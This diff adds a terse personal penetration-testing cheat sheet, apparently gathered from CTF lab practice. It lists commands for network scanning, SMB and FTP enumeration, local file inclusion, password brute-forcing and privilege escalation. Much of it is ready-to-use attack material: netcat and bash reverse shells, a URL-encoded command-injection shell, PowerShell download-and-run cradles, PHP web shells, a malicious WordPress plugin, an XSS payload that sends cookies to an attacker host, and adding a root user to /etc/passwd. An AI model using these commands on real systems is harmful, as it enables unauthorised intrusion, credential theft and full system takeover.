@@ -1,0 +1,299 @@
+export IP="10.10.10.10"
+Scanig with nmap:
+start with:
+1nmap -Pn <ip>
+2nmap -Pn -p1000- <ip>
+3nmap -A -p 22,111,5601,8000,9200,9300 <ip>
+4nmap --script vuln -p 22,111,5601,8000,9200,9300 <ip>
+nmap -A -T5 <ip> -vv (show info including OS)
+sudo nmap -sS -sV --script vuln  -v 10.10.119.148
+nfs search: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
+
+scan ftp nmap --script=ftp-brute,ftp-anon,ftp-syst,ftp-proftpd-backdoor -p 21 10.10.124.89
+scan smb shares nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse
+scan rpc nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.250.238
+dowload from ftp:
+wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
+
+enum4linux -a <ip>
+
+get files from smb:
+smbclient -L <ip> (listing)
+smbclient -N //<ip>/dir
+get firlname
+
+mount from SMB:
+mkdir /mnt/linky_share
+mount -t cifs -o user=luke //192.168.1.104/share /mnt/linky_share
+unmount:
+sudo umount /mnt/linky_share
+
+whe you have RCE to get shell:
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f"
+nc on host
+
+check hidden dirs of webpage:
+gobuster dir -u http://10.10.210.146:3333/ -w directory-list-2.3-medium.txt -t 35
+gobuster dir -e -u http://10.10.99.114:80/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 35
+gobuster dir -e -u http://10.10.124.89/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html or .ticket
+or used dirbuster
+
+samba shares:
+smbclient -N -L //<ip>/ (check to enumerate sambashares)
+
+in url:
+http://10.10.56.130/?view=../../../../../../../../../etc/passwd(&ext=)
+http://10.10.247.210/?view=php://filter/convert.base64-encode/resource=dog/../index
+http://10.10.247.210/?view=dog/../../../../../var/log/apache2/access.log&ext= (access logs)
+
+send shell.php to the target using curl:curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://10.9.96.217:8000/shell.php'))?>" -s http://10.10.75.120 <!DOCTYPE HTML>
+
+reverse ssh firewald port:
+ ssh -L 10001:127.0.0.1:10000 agent47@10.10.184.65
+
+
+SUDO:
+sudo -l
+sudo -V if version <1.8.27
+if verision 1.8.27 sudo -u#-1 /bin/bash
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+MSF:
+postgressql
+msfconsole
+-db_nmap -sV <ip>
+-hosts
+-services
+-vulns
+-ps
+-migrate <pid>
+-getuid
+-sysinfo
+-load kiwi(mimikatz)
+-getprivs
+-run post/windows/gather/checkvm (check if vm)
+-run post/multi/recon/local_exploit_suggester (suggest exploits)
+-run post/windows/manage/enable_rdp
+-run autoroute -h
+-auxiliary/server/socks4a
+-proxychains
+load powershell
+powershell_shell
+
+
+gather/search_email_collector
+
+in msf to gain shell:
+SHELL=/bin/bash script -q /dev/null
+
+search for some exploits escalate privs: run post/multi/recon/local_exploit_suggester
+
+searching:
+find / 2>>/dev/null | grep -i "flag"
+
+for web
+check dirs:
+dirb http://10.10.176.119
+than user dirbuster gui
+-if retro found wordpress:
+scan the website: wpscan --url http://10.10.176.119/retro/
+scan for users: wpscan --url http://10.10.176.119/retro/ --enumerate u
+log in: http://10.10.176.119/retro/wp-login.php
+https://github.com/wetw0rk/malicious-wordpress-plugin
+python3 wordpwn.py <lhost> <lport> Y
+a listener will be opened
+add the .zip malicious file to plugins on the wordpress
+install and activate
+access it through: http://<ip>/retro/wp-content/plugins/malicious/wetw0rk_maybe.php
+if failed try accessin index.php inthem editor:
+run: /ninshang/shell python -m SimpleHTTPServer 80
+than add to index:
+<?php
+exec("powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.11.30/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.11.30 -Port 1234");
+?>
+run: nc -lvp 1234
+WORDPRESS:
+use /usr/share/webshells/php/php-reverse-shell (edit ip and pot)
+zip the file
+open nc -lvp <port>
+upload and acticate the zip
+
+to get shell:
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-z
+stty raw -echo; fg
+also:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+to send files using http:
+python -m SimpleHTTPServer (run inside the location of the file to upload)
+sudo python3 -m http.server 80
+torget machine:
+cd /tmp/
+linux: wget 10.8.3.22:8000/LinEnum.sh
+windows: powershell -c "Invoke-WebRequest -Uri 'http://10.11.17.71:80/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
+
+
+create a new password for /etc/passwd:
+openssl passwd -1 -salt [salt] [password]
+
+send from remote to locate:
+remote: nc -w 0 -lnvp 12345 < test
+local: nc 10.10.241.248 12345 > test
+vice versa
+
+open ports:
+sudo netstat -plntu
+
+extract files from a file:
+binwalk -e file
+
+for hydra cracking web POST:
+xhydra: /wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
+also:
+copied from burpsuite http-post-form://mrrobot.thm:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username
+hydra -l molly -P ~/Desktop/rockyou.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:F=<THEERROR message of wrong log in Your username or password is incorrect." -V
+
+also:
+find / -type f -user pingu 2>/dev/null (files owned by user)
+find / -name pass* 2>/dev/null
+find / -user pingu -print 2>/dev/null
+finding SUID SGUI files:
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+or: find / -perm -u=s -type f 2>/dev/null
+we can use find because it is s:
+runas another user: ./find . -exec /bin/sh -p \; -quit
+other: https://gtfobins.github.io/
+--> for Find: (change permession for root folder)
+find . -exec chmod 777 /root \;
+find /root -exec ls /root \;
+
+audit logs:
+cat * | grep 'comm="su"'
+             'comm="sudo"'
+
+-->strings /usr/bin/menu
+cd /tmp
+echo   /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+
+capabilities:
+getcap -r / 2>/dev/null
+
+find:
+find / -name *.txt
+find / -name "*s3cr3t*" 2>/dev/null
+finds any typed passwords by mistake: cat ~/.*history | less
+
+if nano is root:
+create a root user:
+openssl passwd -1 username
+edit /etc/passwd with nano:
+username:createdHash:0:0:root:/root...
+
+stegcracker:
+cd /home/joseph/.local/bin 
+p
+
+dorks:
+ghdb
+
+Searching what a binary can be runas:
+find foo -exec whoami \;
+
+echo 'import pty;pty.spawn("/bin/bash");' >> random.py (insert sehll into py code)
+
+string variables:
+strings teaParty
+strace -v -f -e execve /home/rabbit/teaParty 2>&1 | grep exec
+create malicious date:
+cd /tmp
+echo /bin/sh > date
+chmod 777 date
+export PATH=/tmp:$PATH
+
+SSh:
+ssh holly@10.10.204.135 -p65534
+
+curl:
+curl http://some.url --output some.file
+
+sudo wget --post-file=/root/root_flag.txt 10.9.**.**:1234
+
+Craking zip:
+fcrackzip -b --method 2 -D -p ./rockyou.txt -v christmaslists.zip
+
+Stego:
+steghide info TryHackMe.jpg
+steghide extract -sf TryHackMe.jpg
+
+in msf:
+getsystem to escelate privilages
+/bin/sh -i make shell TTY (more interactive)
+searching:
+find / 2>>/dev/null | grep -i "flag"
+search a line: awk 'NR==52' file
+
+XSS:
+cookie stealing:
+<script>alert(document.cookie);</script> to test
+after registering and log in
+open litiner: nc -lvp 80
+use: <script>window.location = 'http://<yourIP>/page?param=' + document.cookie </script>
+
+gain php reverse shell:php reverse shell save file as php and upload if not php phtml alo works
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
+?>
+
+<img src=http://ip.address/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'ip.address'$IFS'1234')>
+
+Command injection:
+for bash:
+From: bash -i >& /dev/tcp/<ip>/<port> 0>&1
+To: bash %2di >& %2fdev%2ftcp%2f<ip>%2f<port> 0>&1 (used in http down)
+create listener: nc -lvp 4447
+use: http://<ip>:3000/api/cmd/bash %2di >& %2fdev%2ftcp%2f<ip>%2f<port> 0>&1
+
+add shell to file:
+echo “;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.99.236 9999 >/tmp/f” > .quotes
+rm -f /tmp/p; mknod /tmp/p p && nc 10.8.99.236 4444 0/tmp/p
+also:
+$ cat > /tmp/shell.sh << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/10.9.0.54/4444 0>&1
+EOF
+$ chmod +x /tmp/shell.sh
+$ printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
+
+
+change file typr from jpg to png:
+printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
+
+sqlmap:
+if form end with: --forms --dump
+
+send file inpowershell:
+powershell -c "Invoke-WebRequest 'http://10.9.0.54:8000/launcher.bat' -OutFile 'C:\windows\temp\launcher.bat'"
+
+search for root processes:
+ps -elf|grep root
+
+creating a image of a usb stick:
+sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd
+
+windows upload in cmd:
+certutil -urlcache -split -f http://10.10.14.7/shell.bat C:\\users\\public\\shell.bat
+then run cmd /c path
+
+also:
+host:   impacket-smbserver "foldername" `pwd`
+remote: net use z: \\10.10.14.5\foldername
+
+encode powershell:
+echo -n "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6688" | iconv --to-code UTF-16LE | base64 -w 0
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
